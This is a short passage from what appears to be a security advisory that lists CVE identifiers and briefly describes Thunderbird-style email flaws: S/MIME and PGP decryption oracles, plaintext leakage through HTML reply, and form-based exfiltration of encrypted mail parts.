[CVE-2018-12363](/security/CVE-2018-12363), [CVE-2018-12364](/security/CVE-2018-12364), [CVE-2018-12365](/security/CVE-2018-12365), [CVE-2018-12366](/security/CVE-2018-12366))

It was discovered that S/MIME and PGP decryption oracles can be built with

HTML emails. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12372](/security/CVE-2018-12372))

It was discovered that S/MIME plaintext can be leaked through HTML

reply/forward. An attacker could potentially exploit this to obtain

sensitive information. ([CVE-2018-12373](/security/CVE-2018-12373))

It was discovered that forms can be used to exfiltrate encrypted mail

parts by pressing enter in a form field. An attacker could potentially

exploit this to obtain sensitive information. ([CVE-2018-12374](/security/CVE-2018-12374))
